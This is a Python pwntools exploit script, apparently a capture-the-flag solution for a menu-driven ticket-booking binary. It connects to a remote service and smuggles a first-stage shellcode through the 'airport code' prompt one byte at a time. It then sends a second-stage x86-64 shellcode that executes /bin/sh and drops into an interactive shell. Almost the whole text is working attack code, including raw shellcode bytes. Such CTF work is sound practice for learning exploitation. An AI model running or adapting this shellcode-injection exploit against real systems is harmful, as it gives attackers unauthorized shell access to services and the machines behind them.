import argparse
import codecs
#import leb128
import math
import threading

from pwn import *

context.log_level = 'debug'
# context.log_level = 'error'
context.terminal = ['tmux', 'splitw', '-h']

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")

args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

# r = process(['./challenge'])
# gdb.attach(r, f'''
# c
# ''')

sc = b'H\x8d5\x0b\x00\x00\x001\xc01\xff\xba\x00\x01\x00\x00\x0f\x05'
# shellcode NOT from binja because binja's shellcode didn't work
# thanks a lot, binja
sc2 = b'\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

r.sendafter(b'3: Get tickets!\n', b'd\n')
for b in sc:
    r.sendafter(b'3: Get tickets!\n', b'1\n')
    r.sendafter(b'Please enter airport code: ', b'A' * b + b'\x00')
r.sendafter(b'3: Get tickets!\n', b'3\n')
r.send(sc2)

r.interactive()
